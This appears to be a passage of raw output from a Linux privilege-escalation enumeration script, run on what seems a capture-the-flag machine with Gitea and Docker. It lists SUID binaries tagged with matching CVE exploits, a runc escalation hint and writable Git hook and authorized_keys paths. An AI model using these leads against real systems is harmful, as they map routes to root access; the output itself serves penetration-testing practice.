ctr: failed to dial "/run/containerd/containerd.sock": connection error: desc = "transport: error while dialing: dial unix /run/containerd/containerd.sock: connect: permission denied"

â•”â•â•â•â•â•â•â•â•â•â•â•£ Checking if runc is available
â•š https://book.hacktricks.xyz/linux-hardening/privilege-escalation/runc-privilege-escalation
runc was found in /usr/sbin/runc, you may be able to escalate privileges with it

â•”â•â•â•â•â•â•â•â•â•â•â•£ Searching docker files (limit 70)
â•š https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation
lrwxrwxrwx 1 root root 33 Sep  5  2020 /etc/systemd/system/sockets.target.wants/docker.socket -> /lib/systemd/system/docker.socket
total 0
-r--r--r-- 1 root root 0 Nov  5 12:10 blkio.io_merged
-r--r--r-- 1 root root 0 Nov  5 12:10 blkio.io_merged_recursive
-r--r--r-- 1 root root 0 Nov  5 12:10 blkio.io_queued
-r--r--r-- 1 root root 0 Nov  5 12:10 blkio.io_queued_recursive
-r--r--r-- 1 root root 0 Nov  5 12:10 blkio.io_service_bytes
-r--r--r-- 1 root root 0 Nov  5 12:10 blkio.io_service_bytes_recursive
-r--r--r-- 1 root root 0 Nov  5 12:10 blkio.io_service_time
-r--r--r-- 1 root root 0 Nov  5 12:10 blkio.io_service_time_recursive
-r--r--r-- 1 root root 0 Nov  5 12:10 blkio.io_serviced
-r--r--r-- 1 root root 0 Nov  5 12:10 blkio.io_serviced_recursive
-r--r--r-- 1 root root 0 Nov  5 12:10 blkio.io_wait_time
-r--r--r-- 1 root root 0 Nov  5 12:10 blkio.io_wait_time_recursive
-rw-r--r-- 1 root root 0 Nov  5 12:10 blkio.leaf_weight
-rw-r--r-- 1 root root 0 Nov  5 12:10 blkio.leaf_weight_device
--w------- 1 root root 0 Nov  5 12:10 blkio.reset_stats
-r--r--r-- 1 root root 0 Nov  5 12:10 blkio.sectors
-r--r--r-- 1 root root 0 Nov  5 12:10 blkio.sectors_recursive
-r--r--r-- 1 root root 0 Nov  5 12:10 blkio.throttle.io_service_bytes
-r--r--r-- 1 root root 0 Nov  5 12:10 blkio.throttle.io_serviced
-rw-r--r-- 1 root root 0 Nov  5 12:10 blkio.throttle.read_bps_device
-rw-r--r-- 1 root root 0 Nov  5 12:10 blkio.throttle.read_iops_device
-rw-r--r-- 1 root root 0 Nov  5 12:10 blkio.throttle.write_bps_device
-rw-r--r-- 1 root root 0 Nov  5 12:10 blkio.throttle.write_iops_device
-r--r--r-- 1 root root 0 Nov  5 12:10 blkio.time
-r--r--r-- 1 root root 0 Nov  5 12:10 blkio.time_recursive
-rw-r--r-- 1 root root 0 Nov  5 12:10 blkio.weight
-rw-r--r-- 1 root root 0 Nov  5 12:10 blkio.weight_device
-rw-r--r-- 1 root root 0 Nov  5 12:10 cgroup.clone_children
-rw-r--r-- 1 root root 0 Nov  5 12:10 cgroup.procs
-rw-r--r-- 1 root root 0 Nov  5 12:10 notify_on_release
-rw-r--r-- 1 root root 0 Nov  5 12:10 tasks
total 0
-rw-r--r-- 1 root root 0 Nov  5 12:10 cgroup.clone_children
-rw-r--r-- 1 root root 0 Nov  5 12:10 cgroup.procs
-rw-r--r-- 1 root root 0 Nov  5 12:10 cpu.cfs_period_us
-rw-r--r-- 1 root root 0 Nov  5 12:10 cpu.cfs_quota_us
-rw-r--r-- 1 root root 0 Nov  5 12:10 cpu.shares
-r--r--r-- 1 root root 0 Nov  5 12:10 cpu.stat
-r--r--r-- 1 root root 0 Nov  5 12:10 cpuacct.stat
-rw-r--r-- 1 root root 0 Nov  5 12:10 cpuacct.usage
-r--r--r-- 1 root root 0 Nov  5 12:10 cpuacct.usage_all
-r--r--r-- 1 root root 0 Nov  5 12:10 cpuacct.usage_percpu
-r--r--r-- 1 root root 0 Nov  5 12:10 cpuacct.usage_percpu_sys
-r--r--r-- 1 root root 0 Nov  5 12:10 cpuacct.usage_percpu_user
-r--r--r-- 1 root root 0 Nov  5 12:10 cpuacct.usage_sys
-r--r--r-- 1 root root 0 Nov  5 12:10 cpuacct.usage_user
-rw-r--r-- 1 root root 0 Nov  5 12:10 notify_on_release
-rw-r--r-- 1 root root 0 Nov  5 12:10 tasks
total 0
-rw-r--r-- 1 root root 0 Nov  5 12:10 cgroup.clone_children
-rw-r--r-- 1 root root 0 Nov  5 12:10 cgroup.procs
--w------- 1 root root 0 Nov  5 12:10 devices.allow
--w------- 1 root root 0 Nov  5 12:10 devices.deny
-r--r--r-- 1 root root 0 Nov  5 12:10 devices.list
-rw-r--r-- 1 root root 0 Nov  5 12:10 notify_on_release
-rw-r--r-- 1 root root 0 Nov  5 12:10 tasks
total 0
-rw-r--r-- 1 root root 0 Nov  5 12:10 cgroup.clone_children
--w--w--w- 1 root root 0 Nov  5 12:10 cgroup.event_control
-rw-r--r-- 1 root root 0 Nov  5 12:10 cgroup.procs
-rw-r--r-- 1 root root 0 Nov  5 12:10 memory.failcnt
--w------- 1 root root 0 Nov  5 12:10 memory.force_empty
-rw-r--r-- 1 root root 0 Nov  5 12:10 memory.kmem.failcnt
-rw-r--r-- 1 root root 0 Nov  5 12:10 memory.kmem.limit_in_bytes
-rw-r--r-- 1 root root 0 Nov  5 12:10 memory.kmem.max_usage_in_bytes
-r--r--r-- 1 root root 0 Nov  5 12:10 memory.kmem.slabinfo
-rw-r--r-- 1 root root 0 Nov  5 12:10 memory.kmem.tcp.failcnt
-rw-r--r-- 1 root root 0 Nov  5 12:10 memory.kmem.tcp.limit_in_bytes
-rw-r--r-- 1 root root 0 Nov  5 12:10 memory.kmem.tcp.max_usage_in_bytes
-r--r--r-- 1 root root 0 Nov  5 12:10 memory.kmem.tcp.usage_in_bytes
-r--r--r-- 1 root root 0 Nov  5 12:10 memory.kmem.usage_in_bytes
-rw-r--r-- 1 root root 0 Nov  5 12:10 memory.limit_in_bytes
-rw-r--r-- 1 root root 0 Nov  5 12:10 memory.max_usage_in_bytes
-rw-r--r-- 1 root root 0 Nov  5 12:10 memory.move_charge_at_immigrate
-r--r--r-- 1 root root 0 Nov  5 12:10 memory.numa_stat
-rw-r--r-- 1 root root 0 Nov  5 12:10 memory.oom_control
---------- 1 root root 0 Nov  5 12:10 memory.pressure_level
-rw-r--r-- 1 root root 0 Nov  5 12:10 memory.soft_limit_in_bytes
-r--r--r-- 1 root root 0 Nov  5 12:10 memory.stat
-rw-r--r-- 1 root root 0 Nov  5 12:10 memory.swappiness
-r--r--r-- 1 root root 0 Nov  5 12:10 memory.usage_in_bytes
-rw-r--r-- 1 root root 0 Nov  5 12:10 memory.use_hierarchy
-rw-r--r-- 1 root root 0 Nov  5 12:10 notify_on_release
-rw-r--r-- 1 root root 0 Nov  5 12:10 tasks
total 0
-rw-r--r-- 1 root root 0 Nov  5 12:10 cgroup.clone_children
-rw-r--r-- 1 root root 0 Nov  5 12:10 cgroup.procs
-rw-r--r-- 1 root root 0 Nov  5 12:10 notify_on_release
-rw-r--r-- 1 root root 0 Nov  5 12:10 tasks
total 0
-rw-r--r-- 1 root root 0 Nov  5 12:10 cgroup.clone_children
-rw-r--r-- 1 root root 0 Nov  5 12:10 cgroup.procs
-rw-r--r-- 1 root root 0 Nov  5 12:10 notify_on_release
-r--r--r-- 1 root root 0 Nov  5 12:10 pids.current
-r--r--r-- 1 root root 0 Nov  5 12:10 pids.events
-rw-r--r-- 1 root root 0 Nov  5 12:10 pids.max
-rw-r--r-- 1 root root 0 Nov  5 12:10 tasks
-rw-r--r-- 1 root root 0 Sep  5  2020 /var/lib/systemd/deb-systemd-helper-enabled/sockets.target.wants/docker.socket


â•”â•â•â•â•â•â•â•â•â•â•â•£ Analyzing Postfix Files (limit 70)
-rw-r--r-- 1 root root 675 Apr  2  2018 /usr/share/bash-completion/completions/postfix


â•”â•â•â•â•â•â•â•â•â•â•â•£ Analyzing FTP Files (limit 70)



-rw-r--r-- 1 root root 69 Mar 14  2018 /etc/php/7.2/mods-available/ftp.ini
-rw-r--r-- 1 root root 69 Nov  2  2022 /usr/share/php7.2-common/common/ftp.ini






â•”â•â•â•â•â•â•â•â•â•â•â•£ Analyzing DNS Files (limit 70)
-rw-r--r-- 1 root root 856 Apr  2  2018 /usr/share/bash-completion/completions/bind
-rw-r--r-- 1 root root 856 Apr  2  2018 /usr/share/bash-completion/completions/bind




â•”â•â•â•â•â•â•â•â•â•â•â•£ Analyzing Windows Files (limit 70)






















lrwxrwxrwx 1 root root 20 Sep  3  2020 /etc/alternatives/my.cnf -> /etc/mysql/mysql.cnf
lrwxrwxrwx 1 root root 24 Sep  3  2020 /etc/mysql/my.cnf -> /etc/alternatives/my.cnf
-rw-r--r-- 1 root root 81 Nov 12  2022 /var/lib/dpkg/alternatives/my.cnf





























â•”â•â•â•â•â•â•â•â•â•â•â•£ Analyzing Other Interesting Files (limit 70)
-rw-r--r-- 1 root root 3771 Apr  4  2018 /etc/skel/.bashrc
-rw-r--r-- 1 cookie-monster cookie-monster 3771 Sep  3  2020 /home/cookie-monster/.bashrc





-rw-r--r-- 1 root root 807 Apr  4  2018 /etc/skel/.profile
-rw-r--r-- 1 cookie-monster cookie-monster 807 Sep  3  2020 /home/cookie-monster/.profile






                      â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£ Files with Interesting Permissions â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
                      â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
â•”â•â•â•â•â•â•â•â•â•â•â•£ SUID - Check easy privesc, exploits and write perms
â•š https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
strings Not Found
-rwsr-xr-x 1 root root 427K Mar 30  2022 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 42K Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 99K Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-x 1 root root 14K Jan 12  2022 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-sr-x 1 daemon daemon 51K Feb 20  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwsr-xr-x 1 root root 75K Mar 14  2022 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 40K Mar 14  2022 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 75K Mar 14  2022 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 37K Mar 14  2022 /usr/bin/newgidmap
-rwsr-xr-x 1 root root 146K Jan 19  2021 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 19K Jun 28  2019 /usr/bin/traceroute6.iputils
-rwsr-xr-x 1 root root 59K Mar 14  2022 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 37K Mar 14  2022 /usr/bin/newuidmap
-rwsr-xr-x 1 root root 44K Mar 14  2022 /usr/bin/chsh
-rwsr-xr-x 1 root root 22K Jan 12  2022 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
-rwsr-xr-x 1 root root 43K Sep 16  2020 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 27K Sep 16  2020 /bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 63K Jun 28  2019 /bin/ping
-rwsr-xr-x 1 root root 44K Mar 14  2022 /bin/su
-rwsr-xr-x 1 root root 31K Aug 11  2016 /bin/fusermount

â•”â•â•â•â•â•â•â•â•â•â•â•£ SGID
â•š https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
-rwxr-sr-x 1 root utmp 10K Mar 11  2016 /usr/lib/x86_64-linux-gnu/utempter/utempter
-rwsr-sr-x 1 daemon daemon 51K Feb 20  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwxr-sr-x 1 root ssh 355K Mar 30  2022 /usr/bin/ssh-agent
-rwxr-sr-x 1 root shadow 71K Mar 14  2022 /usr/bin/chage
-rwxr-sr-x 1 root mlocate 43K Mar  1  2018 /usr/bin/mlocate
-rwxr-sr-x 1 root tty 31K Sep 16  2020 /usr/bin/wall
-rwxr-sr-x 1 root shadow 23K Mar 14  2022 /usr/bin/expiry
-rwxr-sr-x 1 root tty 14K Jan 17  2018 /usr/bin/bsd-write
-rwxr-sr-x 1 root crontab 39K May 10  2022 /usr/bin/crontab
-rwxr-sr-x 1 root shadow 34K Apr  8  2021 /sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 34K Apr  8  2021 /sbin/unix_chkpwd

â•”â•â•â•â•â•â•â•â•â•â•â•£ Checking misconfigurations of ld.so
â•š https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld.so
/etc/ld.so.conf
Content of /etc/ld.so.conf:
include /etc/ld.so.conf.d/*.conf

/etc/ld.so.conf.d
  /etc/ld.so.conf.d/libc.conf
  - /usr/local/lib
  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
  - /usr/local/lib/x86_64-linux-gnu
  - /lib/x86_64-linux-gnu
  - /usr/lib/x86_64-linux-gnu

/etc/ld.so.preload
â•”â•â•â•â•â•â•â•â•â•â•â•£ Capabilities
â•š https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities
â•â•â•£ Current shell capabilities
CapInh:  0x0000000000000000=
CapPrm:  0x0000000000000000=
CapEff:	 0x0000000000000000=
CapBnd:  0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
CapAmb:  0x0000000000000000=

â•â•â•£ Parent process capabilities
CapInh:	 0x0000000000000000=
CapPrm:	 0x0000000000000000=
CapEff:	 0x0000000000000000=
CapBnd:	 0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
CapAmb:	 0x0000000000000000=


Files with capabilities (limited to 50):
/usr/bin/mtr-packet = cap_net_raw+ep

â•”â•â•â•â•â•â•â•â•â•â•â•£ Users with capabilities
â•š https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities

â•”â•â•â•â•â•â•â•â•â•â•â•£ AppArmor binary profiles
-rw-r--r-- 1 root root 3194 Mar 26  2018 sbin.dhclient
-rw-r--r-- 1 root root  125 Apr  2  2018 usr.bin.lxc-start
-rw-r--r-- 1 root root 2857 Apr  7  2018 usr.bin.man
-rw-r--r-- 1 root root 1811 Sep  3  2020 usr.sbin.mysqld
-rw-r--r-- 1 root root 1550 Apr 24  2018 usr.sbin.rsyslogd
-rw-r--r-- 1 root root 1353 Mar 31  2018 usr.sbin.tcpdump

â•”â•â•â•â•â•â•â•â•â•â•â•£ Files with ACLs (limited to 50)
â•š https://book.hacktricks.xyz/linux-hardening/privilege-escalation#acls
files with acls in searched folders Not Found

â•”â•â•â•â•â•â•â•â•â•â•â•£ Files (scripts) in /etc/profile.d/
â•š https://book.hacktricks.xyz/linux-hardening/privilege-escalation#profiles-files
total 24
drwxr-xr-x  2 root root 4096 Nov 12  2022 .
drwxr-xr-x 96 root root 4096 Nov 12  2022 ..
-rw-r--r--  1 root root   96 Aug 13  2020 01-locale-fix.sh
-rw-r--r--  1 root root 1557 Dec  4  2017 Z97-byobu.sh
-rw-r--r--  1 root root  664 Apr  2  2018 bash_completion.sh
-rw-r--r--  1 root root 1003 Dec 29  2015 cedilla-portuguese.sh

â•”â•â•â•â•â•â•â•â•â•â•â•£ Permissions in init, init.d, systemd, and rc.d
â•š https://book.hacktricks.xyz/linux-hardening/privilege-escalation#init-init-d-systemd-and-rc-d

â•â•£ Hashes inside passwd file? ........... No
â•â•£ Writable passwd file? ................ No
â•â•£ Credentials in fstab/mtab? ........... No
â•â•£ Can I read shadow files? ............. No
â•â•£ Can I read shadow plists? ............ No
â•â•£ Can I write shadow plists? ........... No
â•â•£ Can I read opasswd file? ............. No
â•â•£ Can I write in network-scripts? ...... No
â•â•£ Can I read root folder? .............. No

â•”â•â•â•â•â•â•â•â•â•â•â•£ Searching root files in home dirs (limit 30)
/home/
/home/cookie-monster/.mysql_history
/root/
/var/www
/var/www/html/assets
/var/www/html/assets/fonts
/var/www/html/assets/fonts/DancingScript-Regular.otf
/var/www/html/assets/fonts/Alegreya-Regular.otf
/var/www/html/assets/css
/var/www/html/assets/css/style.css
/var/www/html/assets/css/alegreya.css
/var/www/html/assets/css/dancing.css
/var/www/html/assets/img
/var/www/html/assets/img/flag.jpg
/var/www/html/assets/img/patience.mp4
/var/www/html/config.php
/var/www/html/index.php

â•”â•â•â•â•â•â•â•â•â•â•â•£ Searching folders owned by me containing others files on it (limit 100)

â•”â•â•â•â•â•â•â•â•â•â•â•£ Readable files belonging to root and readable by me but not world readable

â•”â•â•â•â•â•â•â•â•â•â•â•£ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
â•š https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files
/dev/mqueue
/dev/shm
/gitea/git
/gitea/git/.gitconfig
/gitea/git/.ssh
/gitea/git/.ssh/authorized_keys
/gitea/git/.ssh/authorized_keys_1639145963.gitea_bak
/gitea/git/.ssh/environment
/gitea/git/lfs
/gitea/git/repositories
/gitea/git/repositories/cookie-monster
/gitea/git/repositories/cookie-monster/test-gitea.git
/gitea/git/repositories/cookie-monster/test-gitea.git/HEAD
/gitea/git/repositories/cookie-monster/test-gitea.git/branches
/gitea/git/repositories/cookie-monster/test-gitea.git/config
/gitea/git/repositories/cookie-monster/test-gitea.git/description
/gitea/git/repositories/cookie-monster/test-gitea.git/hooks
/gitea/git/repositories/cookie-monster/test-gitea.git/hooks/applypatch-msg.sample
/gitea/git/repositories/cookie-monster/test-gitea.git/hooks/commit-msg.sample
/gitea/git/repositories/cookie-monster/test-gitea.git/hooks/post-receive
/gitea/git/repositories/cookie-monster/test-gitea.git/hooks/post-receive.d
/gitea/git/repositories/cookie-monster/test-gitea.git/hooks/post-receive.d/gitea
/gitea/git/repositories/cookie-monster/test-gitea.git/hooks/post-update.sample
/gitea/git/repositories/cookie-monster/test-gitea.git/hooks/pre-applypatch.sample
/gitea/git/repositories/cookie-monster/test-gitea.git/hooks/pre-commit.sample
/gitea/git/repositories/cookie-monster/test-gitea.git/hooks/pre-merge-commit.sample
/gitea/git/repositories/cookie-monster/test-gitea.git/hooks/pre-push.sample
#)You_can_write_even_more_files_inside_last_directory

/gitea/git/repositories/cookie-monster/test-gitea.git/hooks/pre-receive.d/gitea
/gitea/git/repositories/cookie-monster/test-gitea.git/hooks/pre-receive.sample
/gitea/git/repositories/cookie-monster/test-gitea.git/hooks/prepare-commit-msg.sample
/gitea/git/repositories/cookie-monster/test-gitea.git/hooks/update
/gitea/git/repositories/cookie-monster/test-gitea.git/hooks/update.d
/gitea/git/repositories/cookie-monster/test-gitea.git/hooks/update.d/gitea
/gitea/git/repositories/cookie-monster/test-gitea.git/hooks/update.sample
/gitea/git/repositories/cookie-monster/test-gitea.git/info
/gitea/git/repositories/cookie-monster/test-gitea.git/info/exclude
/gitea/git/repositories/cookie-monster/test-gitea.git/info/refs
/gitea/git/repositories/cookie-monster/test-gitea.git/objects
/gitea/git/repositories/cookie-monster/test-gitea.git/objects/info
/gitea/git/repositories/cookie-monster/test-gitea.git/objects/info/packs
/gitea/git/repositories/cookie-monster/test-gitea.git/objects/pack
/gitea/git/repositories/cookie-monster/test-gitea.git/refs
/gitea/git/repositories/cookie-monster/test-gitea.git/refs/heads
/gitea/git/repositories/cookie-monster/test-gitea.git/refs/tags
/gitea/gitea
/gitea/gitea/attachments
/gitea/gitea/avatars
/gitea/gitea/avatars/fa1b89617638dc2949d6a2248af8f98e
/gitea/gitea/conf
/gitea/gitea/conf/app.ini
/gitea/gitea/gitea.db
/gitea/gitea/indexers
/gitea/gitea/indexers/issues.bleve
/gitea/gitea/indexers/issues.bleve/index_meta.json
/gitea/gitea/indexers/issues.bleve/rupture_meta.json
/gitea/gitea/indexers/issues.bleve/store
/gitea/gitea/indexers/issues.queue
/gitea/gitea/indexers/issues.queue/000002.ldb
/gitea/gitea/indexers/issues.queue/000037.log
/gitea/gitea/indexers/issues.queue/CURRENT
/gitea/gitea/indexers/issues.queue/CURRENT.bak
/gitea/gitea/indexers/issues.queue/LOCK
#)You_can_write_even_more_files_inside_last_directory

/gitea/gitea/log
/gitea/gitea/log/gitea.log
/gitea/gitea/log/gitea.log.2020-09-06.001.gz
/gitea/gitea/queues
/gitea/gitea/queues/notification-service
/gitea/gitea/queues/notification-service/000002.ldb
/gitea/gitea/queues/notification-service/000041.log
/gitea/gitea/queues/notification-service/CURRENT
/gitea/gitea/queues/notification-service/CURRENT.bak
/gitea/gitea/queues/notification-service/LOCK
#)You_can_write_even_more_files_inside_last_directory

/gitea/gitea/queues/pr_patch_checker
/gitea/gitea/queues/pr_patch_checker/000002.ldb
/gitea/gitea/queues/pr_patch_checker/000033.log
/gitea/gitea/queues/pr_patch_checker/CURRENT
/gitea/gitea/queues/pr_patch_checker/CURRENT.bak
/gitea/gitea/queues/pr_patch_checker/LOCK
#)You_can_write_even_more_files_inside_last_directory

/gitea/gitea/queues/repo_stats_update
/gitea/gitea/queues/repo_stats_update/000002.ldb
/gitea/gitea/queues/repo_stats_update/000037.log
/gitea/gitea/queues/repo_stats_update/CURRENT
/gitea/gitea/queues/repo_stats_update/CURRENT.bak
/gitea/gitea/queues/repo_stats_update/LOCK
#)You_can_write_even_more_files_inside_last_directory

/gitea/gitea/queues/task
/gitea/gitea/queues/task/000002.ldb
/gitea/gitea/queues/task/000033.log
/gitea/gitea/queues/task/CURRENT
/gitea/gitea/queues/task/CURRENT.bak
/gitea/gitea/queues/task/LOCK
#)You_can_write_even_more_files_inside_last_directory

/gitea/gitea/sessions
/gitea/gitea/sessions/1
/gitea/gitea/sessions/1/2
/gitea/gitea/sessions/1/f
/gitea/gitea/sessions/2
/gitea/gitea/sessions/2/3
/gitea/gitea/sessions/3
/gitea/gitea/sessions/3/4
/gitea/gitea/sessions/4
/gitea/gitea/sessions/4/c
/gitea/gitea/sessions/5
/gitea/gitea/sessions/5/1
/gitea/gitea/sessions/5/8
/gitea/gitea/sessions/8
/gitea/gitea/sessions/8/6
/gitea/gitea/sessions/8/e
/gitea/gitea/sessions/9
/gitea/gitea/sessions/9/4
/gitea/gitea/sessions/d
/gitea/gitea/sessions/d/c
/home/cookie-monster
/run/lock
/run/screen
/tmp
/tmp/.ICE-unix
/tmp/.Test-unix
/tmp/.X11-unix
/tmp/.XIM-unix
/tmp/.font-unix
#)You_can_write_even_more_files_inside_last_directory

/var/crash
/var/lib/lxcfs/cgroup/memory/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/docker/42040a8f97fc38af61598b5a6e3f0bb08830bcb14b5b68a211201979658e4073/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/docker/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/accounts-daemon.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/apache2.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/atd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/containerd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/cron.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dbus.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dev-hugepages.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dev-mqueue.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/docker.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/docker.socket/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/irqbalance.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/lvm2-lvmetad.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/lxcfs.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/mysql.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/networkd-dispatcher.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/polkit.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/proc-sys-fs-binfmt_misc.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/rsyslog.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/ssh.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/sys-fs-fuse-connections.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/sys-kernel-config.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/sys-kernel-debug.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/system-getty.slice/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/system-serialx2dgetty.slice/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-journald.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-logind.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-networkd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-resolved.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-timesyncd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-udevd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/unattended-upgrades.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/user.slice/cgroup.event_control
/var/lib/php/sessions
/var/tmp
/var/www/html
/var/www/html/test7.txt

â•”â•â•â•â•â•â•â•â•â•â•â•£ Interesting GROUP writable files (not in Home) (max 500)
â•š https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files



                            â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£ Other Interesting Files â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
                            â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
â•”â•â•â•â•â•â•â•â•â•â•â•£ .sh files in path
â•š https://book.hacktricks.xyz/linux-hardening/privilege-escalation#script-binaries-in-path
/usr/bin/gettext.sh

â•”â•â•â•â•â•â•â•â•â•â•â•£ Executable files potentially added by user (limit 70)
2021-12-10+14:21:15.8204045180 /gitea/git/repositories/cookie-monster/test-gitea.git/hooks/update.d/gitea
2021-12-10+14:21:15.8204045180 /gitea/git/repositories/cookie-monster/test-gitea.git/hooks/update
2021-12-10+14:21:15.8204045180 /gitea/git/repositories/cookie-monster/test-gitea.git/hooks/pre-receive.d/gitea
2021-12-10+14:21:15.8204045180 /gitea/git/repositories/cookie-monster/test-gitea.git/hooks/pre-receive
2021-12-10+14:21:15.8204045180 /gitea/git/repositories/cookie-monster/test-gitea.git/hooks/post-receive.d/gitea
2021-12-10+14:21:15.8204045180 /gitea/git/repositories/cookie-monster/test-gitea.git/hooks/post-receive
2020-09-03+17:33:04.3268755230 /etc/console-setup/cached_setup_terminal.sh
2020-09-03+17:33:04.3268755230 /etc/console-setup/cached_setup_keyboard.sh
2020-09-03+17:33:04.3268755230 /etc/console-setup/cached_setup_font.sh

â•”â•â•â•â•â•â•â•â•â•â•â•£ Unexpected in /opt (usually empty)
total 12
drwxr-xr-x  3 root root 4096 Sep  5  2020 .
drwxr-xr-x 23 root root 4096 Nov 12  2022 ..
drwx--x--x  4 root root 4096 Sep  5  2020 containerd

â•”â•â•â•â•â•â•â•â•â•â•â•£ Unexpected in root
/initrd.img
/gitea
/initrd.img.old
/vmlinuz
/swapfile
/vmlinuz.old

